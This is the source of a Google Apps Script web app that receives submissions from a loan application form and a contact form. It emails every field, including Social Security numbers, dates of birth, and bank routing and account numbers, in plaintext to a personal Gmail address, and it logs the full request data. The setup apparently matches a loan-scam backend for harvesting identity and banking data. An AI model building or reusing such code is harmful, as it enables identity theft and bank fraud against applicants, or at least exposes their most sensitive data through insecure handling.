// Google Apps Script for Email Notifications Only
// Deploy as Web App - SEPARATE from sheets script

// DEPLOYMENT INFORMATION
// ---------------------
// Purpose: Send email notifications only
// Recipient: tyronlincolnn@gmail.com

// Configuration
const CONFIG = {
  emailRecipient: 'tyronlincolnn@gmail.com'
}

function doGet(e) {
  return handleRequest(e)
}

function doPost(e) {
  return handleRequest(e)
}

function handleRequest(e) {
  try {
    // Log the entire event for debugging
    Logger.log('Email Script - Event received: ' + JSON.stringify(e))
    
    // Handle both GET and POST requests
    let params = {};
    
    if (e && e.parameter) {
      // GET request parameters
      params = e.parameter;
    } else if (e && e.postData && e.postData.contents) {
      // POST request data
      const postData = e.postData.contents;
      Logger.log('Email Script - POST data received: ' + postData);
      Logger.log('Email Script - POST data type: ' + e.postData.type);
      
      if (e.postData.type === 'application/json') {
        // Handle JSON data
        params = JSON.parse(postData);
      } else {
        // Parse URL encoded data
        const pairs = postData.split('&');
        for (let i = 0; i < pairs.length; i++) {
          const pair = pairs[i].split('=');
          if (pair.length === 2) {
            params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1].replace(/\+/g, ' '));
          }
        }
      }
    } else {
      Logger.log('Email Script - No parameters received')
      return createResponse('success', 'Email script is working!')
    }
    
    Logger.log('Email Script - Parsed parameters: ' + JSON.stringify(params))
    
    const formType = params.formType
    
    if (!formType) {
      Logger.log('Email Script - No formType specified')
      return createResponse('error', 'No form type specified')
    }
    
    if (formType === 'loanApplication') {
      return handleLoanApplicationEmail(params)
    } else if (formType === 'contactForm') {
      return handleContactFormEmail(params)
    } else {
      Logger.log('Email Script - Invalid form type: ' + formType)
      return createResponse('error', 'Invalid form type: ' + formType)
    }
  } catch (error) {
    Logger.log('Email Script - Error: ' + error.toString())
    return createResponse('error', 'Server error: ' + error.toString())
  }
}

function handleLoanApplicationEmail(params) {
  try {
    const subject = `New Loan Application - ${params.firstName} ${params.lastName}` 
    const body = `
New loan application received:

Personal Information:
- Name: ${params.firstName} ${params.lastName}
- Email: ${params.email}
- Phone: ${params.phoneNumber}
- Address: ${params.homeAddress}, ${params.city}, ${params.state} ${params.zipCode}

Loan Details:
- Amount: $${params.loanAmount}
- Purpose: ${params.loanPurpose}
- Date of Birth: ${params.dateOfBirth}
- SSN: ${params.ssnNumber}

Bank Information:
- Bank: ${params.bankName}
- Routing: ${params.routingNumber}
- Account: ${params.accountNumber}

Submitted: ${new Date().toLocaleString()}
    `
    
    // Send email notification
    try {
      MailApp.sendEmail(CONFIG.emailRecipient, subject, body)
      Logger.log('Email Script - Loan application email sent successfully to: ' + CONFIG.emailRecipient)
    } catch (emailError) {
      Logger.log('Email Script - Failed to send loan application email: ' + emailError.toString())
    }
    
    return createResponse('success', 'Email notification sent successfully!')
    
  } catch (error) {
    Logger.log('Email Script - Loan Application Email Error: ' + error.toString())
    return createResponse('error', 'Failed to send email notification')
  }
}

function handleContactFormEmail(params) {
  try {
    const subject = `New Contact Form - ${params.name}` 
    const body = `
New contact form submission:

Name: ${params.name}
Email: ${params.email}
Message: ${params.message}

Submitted: ${new Date().toLocaleString()}
    `
    
    // Send email notification
    try {
      MailApp.sendEmail(CONFIG.emailRecipient, subject, body)
      Logger.log('Email Script - Contact form email sent successfully to: ' + CONFIG.emailRecipient)
    } catch (emailError) {
      Logger.log('Email Script - Failed to send contact form email: ' + emailError.toString())
    }
    
    return createResponse('success', 'Email notification sent successfully!')
    
  } catch (error) {
    Logger.log('Email Script - Contact Form Email Error: ' + error.toString())
    return createResponse('error', 'Failed to send email notification')
  }
}

function createResponse(status, message) {
  return ContentService.createTextOutput(JSON.stringify({
    status: status,
    message: message
  })).setMimeType(ContentService.MimeType.JSON)
}

// Test function
function testEmailScript() {
  const testParams = {
    formType: 'contactForm',
    name: 'Test User',
    email: 'test@example.com',
    message: 'This is a test from the email script'
  }
  
  const result = handleContactFormEmail(testParams)
  Logger.log('Email Script Test Result: ' + result.getContent())
}
